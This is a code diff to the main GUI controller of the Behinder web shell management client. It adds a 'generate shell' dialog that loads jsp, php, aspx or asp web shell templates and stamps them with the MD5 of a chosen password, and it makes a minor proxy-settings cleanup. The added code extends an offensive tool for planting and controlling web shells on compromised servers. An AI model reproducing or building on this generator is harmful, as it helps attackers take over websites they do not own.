@@ -1,8 +1,3 @@
-//
-// Source code recreated from a .class file by IntelliJ IDEA
-// (powered by FernFlower decompiler)
-//
-
 package net.rebeyond.behinder.ui.controller;
 
 import java.io.ByteArrayInputStream;
@@ -78,6 +73,8 @@ public class MainController {
     @FXML
     private TableColumn addTimeCol;
     @FXML
+    public MenuItem generateBtn;
+    @FXML
     private MenuItem proxySetupBtn;
     @FXML
     private Label statusLabel;
@@ -145,6 +142,61 @@ public class MainController {
     }
 
     private void initToolbar() {
+        this.generateBtn.setOnAction((event) -> {
+            Alert inputDialog = new Alert(AlertType.NONE);
+            Window window = inputDialog.getDialogPane().getScene().getWindow();
+            window.setOnCloseRequest((e) -> {
+                window.hide();
+            });
+            GridPane gridpane = new GridPane();
+            gridpane.setVgap(15.0D);
+            ComboBox comboBox = new ComboBox();
+            comboBox.setPromptText("选择shell类型");
+            comboBox.setItems(FXCollections.observableArrayList("jsp", "php", "aspx", "asp"));
+            TextField textField = new TextField();
+            Button button = new Button("生成shell");
+            TextArea textArea = new TextArea();
+            HBox hBox = new HBox();
+            hBox.setSpacing(50D);
+            hBox.getChildren().add(comboBox);
+            hBox.getChildren().add(textField);
+            hBox.getChildren().add(button);
+            button.setOnAction(event1 -> {
+
+                String shellType = comboBox.getValue().toString();
+                try {
+                    if(!shellType.equals("") && !textField.getText().equals("")) {
+                        String shellPath;
+                        switch (shellType) {
+                            case "jsp":
+                                shellPath = "template/shell.jsp";
+                                break;
+                            case "php":
+                                shellPath = "template/shell.php";
+                                break;
+                            case "aspx":
+                                shellPath = "template/shell.aspx";
+                                break;
+                            case "asp":
+                                shellPath = "template/shell.asp";
+                                break;
+                            default:
+                                throw new IllegalStateException("Unexpected value: " + shellType);
+                        }
+                        String shellText = new String(Utils.getResourceData(shellPath));
+                        textArea.setText(shellText.replace("e45e329feb5d925b", Utils.getMD5(textField.getText())));
+                    }
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            });
+
+            gridpane.add(hBox, 0, 0);
+            gridpane.add(textArea, 0, 1);
+
+            inputDialog.getDialogPane().setContent(gridpane);
+            inputDialog.showAndWait();
+        });
         this.proxySetupBtn.setOnAction((event) -> {
             Alert inputDialog = new Alert(AlertType.NONE);
             Window window = inputDialog.getDialogPane().getScene().getWindow();
@@ -165,7 +217,7 @@ public class MainController {
             proxyGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
             Label typeLabel = new Label("类型：");
             ComboBox typeCombo = new ComboBox();
-            typeCombo.setItems(FXCollections.observableArrayList(new String[]{"HTTP", "SOCKS"}));
+            typeCombo.setItems(FXCollections.observableArrayList("HTTP", "SOCKS"));
             typeCombo.getSelectionModel().select(0);
             Label IPLabel = new Label("IP地址：");
             TextField IPText = new TextField();
